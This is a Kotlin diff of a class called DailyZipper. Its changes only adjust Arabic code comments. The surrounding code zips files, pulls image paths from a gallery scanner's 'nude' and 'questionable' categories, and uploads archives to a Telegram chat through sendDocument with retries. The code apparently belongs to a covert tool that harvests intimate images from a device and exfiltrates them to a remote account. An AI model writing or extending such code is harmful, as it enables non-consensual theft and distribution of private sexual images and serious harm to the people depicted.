@@ -93,7 +93,6 @@ class DailyZipper(
     }
 
     init {
-        // ✅ استبدال [] بـ put()
         config.put("max_batch_size", 48L * 1024L * 1024L)
         config.put("storage_extra", 100L * 1024L * 1024L)
         config.put("send_retry_delays", listOf(2000L, 4000L, 8000L))
@@ -159,7 +158,6 @@ class DailyZipper(
             json.keys().forEach { key ->
                 val value = json.opt(key)
                 if (value != null) {
-                    // ✅ استبدال [] بـ put()
                     config.put(key, value)
                 }
             }
@@ -306,7 +304,7 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // ✅ تجنب استخدام [] أو get()، استخدم entries
+                // ✅ استخدام entries بدلاً من [] لتجنب MatchGroupCollection
                 val isOk = if (result is Map<*, *>) {
                     val okEntry = result.entries.firstOrNull { it.key?.toString() == "ok" }
                     val okValue = okEntry?.value
@@ -647,7 +645,7 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ تجنب [] أو get()، استخدم entries
+                            // ✅ استخدام entries بدلاً من [] لتجنب MatchGroupCollection
                             if (item is Map<*, *>) {
                                 val pathEntry = item.entries.firstOrNull { it.key?.toString() == "path" }
                                 val path = pathEntry?.value?.toString()
@@ -730,7 +728,6 @@ class DailyZipper(
     private fun sendMessage(chatId: Long, text: String) {
         if (telegram == null) return
         val params = HashMap<String, Any>()
-        // ✅ استبدال [] بـ put()
         params.put("chat_id", chatId)
         params.put("text", text)
         invokeMethod(telegram, "api", "sendMessage", params)
